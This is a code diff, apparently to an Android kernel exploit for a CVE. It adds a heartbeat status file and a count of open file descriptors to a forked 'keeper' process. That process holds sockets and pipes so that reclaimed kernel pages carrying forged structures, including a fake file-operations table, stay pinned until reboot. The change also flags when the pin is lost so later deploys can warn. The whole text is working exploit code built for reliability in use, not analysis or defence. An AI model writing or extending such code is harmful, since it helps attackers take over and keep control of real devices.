@@ -148,9 +148,75 @@ void run_main_route_threads(void) {
   SYSCHK(pthread_join(cfi, NULL));
 }
 
+/* Keeper liveness/status file. The keeper rewrites it every heartbeat with
+ * its pid, the pinned stage page, and how many fds it still holds open.
+ * A missing file or a stale timestamp means the keeper died — and with it
+ * the pin on the reclaimed kernel pages (see spawn_allocation_keeper). */
+#define KEEPER_STATUS_PATH "/data/local/tmp/.cve43499_hold"
+#define KEEPER_HEARTBEAT_SEC 3600
+
+/* Count open fds of the calling process (via /proc/self/fd). Used to
+ * snapshot how many pin fds (reclaim sockets, physrw pipes) we hold. */
+static int count_open_fds(void) {
+  DIR *dir = opendir("/proc/self/fd");
+  if (!dir) {
+    return -1;
+  }
+  int count = 0;
+  struct dirent *de;
+  int dir_fd = dirfd(dir);
+  while ((de = readdir(dir)) != NULL) {
+    if (de->d_name[0] == '.') {
+      continue;
+    }
+    char *end = NULL;
+    long fd = strtol(de->d_name, &end, 10);
+    if (end == de->d_name || *end || fd == (long)dir_fd) {
+      continue;
+    }
+    count++;
+  }
+  closedir(dir);
+  return count;
+}
+
+static void keeper_write_status(pid_t pid, int held_fds, const char *state) {
+  char buf[256];
+  int len = snprintf(buf, sizeof(buf),
+                     "pid=%d page=%016zx fops=%016zx held_fds=%d state=%s t=%lld\n",
+                     pid, page_base, fake_fops, held_fds, state,
+                     (long long)time(NULL));
+  if (len <= 0 || (size_t)len >= sizeof(buf)) {
+    return;
+  }
+  int fd = open(KEEPER_STATUS_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0600);
+  if (fd < 0) {
+    return;
+  }
+  ssize_t off = 0;
+  while (off < len) {
+    ssize_t n = write(fd, buf + off, (size_t)(len - off));
+    if (n <= 0) {
+      if (errno == EINTR) {
+        continue;
+      }
+      break;
+    }
+    off += n;
+  }
+  close(fd);
+}
+
 static pid_t spawn_allocation_keeper(void) {
+  /* Snapshot the pin set BEFORE forking: every fd open here (SKB reclaim
+   * sockets, physrw pipes) is inherited by the keeper and keeps the
+   * reclaimed kernel pages — with all their forged bytes — allocated
+   * until reboot. If this count ever drops, the pin is gone. */
+  int pin_fds = count_open_fds();
   pid_t child = SYSCHK(fork());
   if (child != 0) {
+    pr_success("stability keeper pid=%d pin_fds=%d page=%016zx\n",
+               child, pin_fds, page_base);
     return child;
   }
 
@@ -176,11 +242,20 @@ static pid_t spawn_allocation_keeper(void) {
   }
 
   struct timespec hold = {
-    .tv_sec = 86400,
+    .tv_sec = KEEPER_HEARTBEAT_SEC,
     .tv_nsec = 0,
   };
+  keeper_write_status(getpid(), pin_fds, "pinned");
   for (;;) {
     syscall(SYS_nanosleep, &hold, NULL);
+    /* Heartbeat: re-verify we still hold the pin set. open fds can only
+     * disappear if something closed them behind our back (nothing should:
+     * stdio is /dev/null and we never touch the inherited fds). A drop
+     * means the stage pages may be recyclable — flag it in the status
+     * file so the next deploy/health check can warn. */
+    int now_fds = count_open_fds();
+    keeper_write_status(getpid(), now_fds,
+                        now_fds < pin_fds ? "PIN_LOST" : "pinned");
   }
 }
 
